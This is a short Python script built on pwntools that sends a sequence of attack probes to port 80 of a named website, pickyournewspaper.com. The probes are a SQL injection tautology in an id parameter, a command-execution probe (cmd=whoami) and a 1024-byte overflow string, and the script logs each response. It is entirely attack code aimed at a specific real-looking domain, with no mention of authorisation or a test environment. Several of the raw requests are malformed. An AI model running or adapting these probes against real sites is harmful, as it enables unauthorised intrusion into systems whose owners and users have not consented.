from pwn import *
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Establish the connection
conn = remote('pickyournewspaper.com', 80)
logging.info("Connection established")

# Function to send a request and receive the response
def send_request(request):
    try:
        conn.send(request)
        response = conn.recv(1024)
        return response.decode('utf-8', errors='ignore')
    except Exception as e:
        logging.error(f"Error sending request: {e}")
        return None

# Send HTTP request
http_request = b"GET / HTTP/1.1\r\nHost: pickyournewspaper.com\r\n\r\n"
response = send_request(http_request)
if response:
    logging.info(f"HTTP Response: {response}")

# Attempt SQL Injection
sql_request = b"GET /?id=1' OR '1'='1 HTTP/1.1\r\nHost: pickyournewspaper.com\r\n\r\n"
sql_response = send_request(sql_request)
if sql_response:
    logging.info(f"SQL Injection Response: {sql_response}")

# Attempt Remote Code Execution (RCE)
rce_request = b"GET /?cmd=whoami HTTP/1.1\r\nHost: pickyournewspaper.com\r\n\r\n"
rce_response = send_request(rce_request)
if rce_response:
    logging.info(f"RCE Response: {rce_response}")

# Attempt Buffer Overflow
overflow_request = b"GET /?buffer=" + b"A" * 1024 + b" HTTP/1.1\r\nHost: pickyournewspaper.com\r\n\r\n"
overflow_response = send_request(overflow_request)
if overflow_response:
    logging.info(f"Overflow Response: {overflow_response}")

# Close the connection
conn.close()
logging.info("Connection closed")
